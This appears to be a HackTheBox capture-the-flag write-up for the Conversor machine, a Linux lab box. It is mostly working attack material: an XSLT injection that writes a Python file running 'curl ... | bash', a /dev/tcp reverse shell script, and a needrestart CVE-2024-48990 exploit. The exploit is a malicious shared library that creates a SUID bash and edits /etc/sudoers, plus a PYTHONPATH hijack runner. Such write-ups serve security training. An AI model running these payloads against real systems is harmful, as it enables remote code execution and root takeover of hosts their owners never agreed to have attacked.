---
title: Conversor - XSLT injection to RCE
date: 2025-12-06 00:00:00 +0000
categories: [HackTheBox Writeups, Linux]
tags: [hackthebox, linux]
---


```
ares@legion:~$ sudo nmap -sVC -A -T4 -p- --min-rate 1000 $target
Nmap scan report for 10.129.90.161 (10.129.90.161)
Host is up (0.055s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://conversor.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   54.13 ms 10.10.14.1 (10.10.14.1)
2   54.35 ms 10.129.90.161 (10.129.90.161)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.44 seconds
```
![[Pasted image 20251130160025.png]]

/about page:
![[Pasted image 20251130164627.png]]
```
tar xvf source_code.tar.gz 
app.py
app.wsgi
install.md
instance/
instance/users.db
scripts/
static/
static/images/
static/images/david.png
static/images/fismathack.png
static/images/arturo.png
static/nmap.xslt
static/style.css
templates/
templates/register.html
templates/about.html
templates/index.html
templates/login.html
templates/base.html
templates/result.html
uploads/
```

install.md
![[Pasted image 20251130165002.png]]
app.py > python crontab

```
┌──(ares㉿legion)-[~/HackTheBox/Conversor]
└─$ open .

┌──(ares㉿legion)-[~/HackTheBox/Conversor]
└─$ ls
nmap.xml  shell.py  shell.sh  shell.xslt

┌──(ares㉿legion)-[~/HackTheBox/Conversor]
└─$ cat nmap.xml  
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="payload.xslt"?>
<root>
  <test>data</test>
</root>


┌──(ares㉿legion)-[~/HackTheBox/Conversor]
└─$ cat shell.py
import os
 os.system("curl 10.10.15.8:8000/shell.sh|bash")


┌──(ares㉿legion)-[~/HackTheBox/Conversor]
└─$ cat shell.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.15.8/9000 0>&1



┌──(ares㉿legion)-[~/HackTheBox/Conversor]
└─$ cat shell.xslt
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
    version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:shell="http://exslt.org/common"
    extension-element-prefixes="shell">

    <xsl:template match="/">
        <shell:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import os
os.system("curl 10.10.15.8:8000/shell.sh | bash")
        </shell:document>
    </xsl:template>
</xsl:stylesheet>

```

![[Pasted image 20251130164348.png]]

We have empty user.db in instances from source code // verify on rev shell:
![[Pasted image 20251130170242.png]]

![[Pasted image 20251130170406.png]]
SSh with creds

Privesc:
![[Pasted image 20251130170753.png]]

Search CVE for version:
![[Pasted image 20251130170903.png]]

Vulnerable to:
https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing
https://github.com/makuga01/CVE-2024-48990-PoC/

Compile payload on your machine:
```
// lib.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
static void a() __attribute__((constructor));
void a() {
    if(geteuid() == 0) {
        setuid(0);
        setgid(0);
        system("cp /bin/bash /tmp/poc; chmod u+s /tmp/poc");
        system("echo 'ALL ALL=(ALL) NOPASSWD: /tmp/poc' >> /etc/sudoers");
    }
}
```

```
gcc -shared -fPIC -o __init__.so lib.c
```

On victim machine, create runner:
```
mkdir -p /tmp/malicious/importlib
wget http://YOUR_IP:8000/__init__.so -O /tmp/malicious/importlib/__init__.so

cat > /tmp/malicious/e.py << 'EOF'
import time
import os
while True:
    try:
        import importlib
    except: pass
    if os.path.exists("/tmp/poc"):
        os.system("sudo /tmp/poc -p")
        break
    time.sleep(1)
EOF

cd /tmp/malicious; PYTHONPATH="$PWD" python3 e.py
```

another ssh tab and run the binary: 
```
sudo /usr/sbin/needrestart
```

```
root@conversor:/tmp/malicious# id
uid=0(root) gid=0(root) groups=0(root)
```
